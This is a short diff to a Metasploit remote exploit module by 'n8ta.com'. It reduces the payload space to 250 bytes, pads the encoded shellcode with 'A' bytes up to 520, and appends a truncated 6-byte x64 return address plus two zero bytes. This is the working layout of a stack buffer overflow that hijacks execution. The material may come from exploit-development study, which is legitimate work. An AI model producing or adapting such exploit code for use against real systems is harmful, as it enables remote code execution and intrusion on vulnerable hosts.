@@ -18,7 +18,7 @@ class MetasploitModule < Msf::Exploit::Remote
                       'Author' => 'n8ta.com',
                       'Payload' => {
                         'MinNops' => 40,
-                        'Space' => 520,
+                        'Space' => 250,
                         'BadChars' => "\x00\x0A",
                       },
                       'Targets' => [
@@ -45,6 +45,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
     #print_status(addresses.to_s)
     buf = payload.encoded
+    buf += "A" * (520-buf.length)
     buf += [addresses['Ret']].pack('Q')[0..5] # 6 byte long pointer (RET)
     buf += [0,0].pack('cc') # 2 unused bytes that MUST be 0x0000 for RET to be a valid poiner on x64.
 
